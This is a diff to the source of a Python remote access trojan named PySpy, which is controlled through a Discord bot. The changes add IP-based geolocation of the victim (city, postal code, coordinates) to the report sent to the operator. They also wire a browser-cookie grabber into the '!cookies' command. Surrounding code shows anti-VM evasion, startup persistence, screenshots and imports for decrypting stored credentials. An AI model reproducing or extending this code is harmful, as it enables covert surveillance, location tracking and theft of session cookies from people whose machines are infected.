@@ -1,3 +1,6 @@
+# This RAT (PySpy) was made by LunarrBlue on Github and should not be used to cause harm or damage to others. Please view the licence provided on Github.
+# https://github.com/LunarrBlue/PySpy
+
 import os
 import platform
 import psutil
@@ -21,6 +24,7 @@ from getpass import getuser
 from discord import Embed, File
 import time
 import requests
+from requests import get
 import win32crypt
 from Crypto.Cipher import AES
 from datetime import datetime, timedelta
@@ -84,7 +88,7 @@ if anti_vm == "True":
     vm = protection_check()
 
     if vm:
-        sys.exit(500)
+        sys.exit()
 
 
 intents = discord.Intents.all()
@@ -605,9 +609,11 @@ def get_public_ip():
         print(f"Error retrieving public IP: {e}")
         return None
 
-    # Command: show_message
 async def show_message(title, message):
     ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)
+
+async def ip_info(ip, arg):
+    return get(f'https://ipapi.co/{ip}/{arg}/').text
 
 add_to_startup()
 
@@ -650,6 +656,13 @@ async def on_ready():
     disk_used = disk.used / (1024 ** 3)
     disk_total = disk.total / (1024 ** 3)
     ip = get_public_ip()
+    latlong = await ip_info(ip, "latlong")
+    postal = await ip_info(ip, "postal")
+    country = await ip_info(ip, "country_name")
+    state = await ip_info(ip, "region")
+    state_code = await ip_info(ip, "region_code")
+    city = await ip_info(ip, "city")
+    timezone = await ip_info(ip, "timezone")
     image = pyautogui.screenshot()
 
     buffer = io.BytesIO()
@@ -663,7 +676,7 @@ async def on_ready():
 
     if new_embed:
         # Assuming you have an existing embed
-        existing_embed = Embed(title=f"New Session Opened ({ip})", description=f"**🖥️ System Information:**\n```System: {system}\nNode: {node}\nRelease: {release}\nVersion: {version}\nMachine: {machine}\nProcesser: {processer}\nArchitecture: {architecture}\nPython Version: {python}```\n**💽 Hardware Information:**\n```Physical CPU Cores: {physical_cores}\nLogical CPU Cores: {logical_cores}\nCPU Frequency: {round(current_freq)} MHz\nMemory: {round(total_ram_gb)} GB\nDisk Ussage: {str(round(disk_used)) + "/" + str(round(disk_total))}```\n\n**🤖 Discord Information:**")
+        existing_embed = Embed(title=f"New Session Opened", description=f"**🖥️ System Information:**\n```System: {system}\nNode: {node}\nRelease: {release}\nVersion: {version}\nMachine: {machine}\nProcesser: {processer}\nArchitecture: {architecture}\nPython Version: {python}```\n**💽 Hardware Information:**\n```Physical CPU Cores: {physical_cores}\nLogical CPU Cores: {logical_cores}\nCPU Frequency: {round(current_freq)} MHz\nMemory: {round(total_ram_gb)} GB\nDisk Ussage: {str(round(disk_used)) + "/" + str(round(disk_total))}```\n**🛜 IP Information:**\n```IPv4: {ip}\nTimezone: {timezone}\nCountry: {country}\nState: {state} ({state_code})\nCity: {city}\nPostal Code: {postal}\nLatitude & Longitude: {latlong}```\n**🤖 Discord Information:**")
         
         # Merging the new embed's description to the existing one (if applicable)
         if new_embed.description:
@@ -756,6 +769,8 @@ async def on_message(message):
     elif message.content.lower() == '!cookies':
         temp_directory = os.path.expanduser("~/tmp")
         cookies_path = os.path.join(temp_directory, "cookies.txt")
+
+        grab_cookies()
         
         if os.path.exists(cookies_path):
             
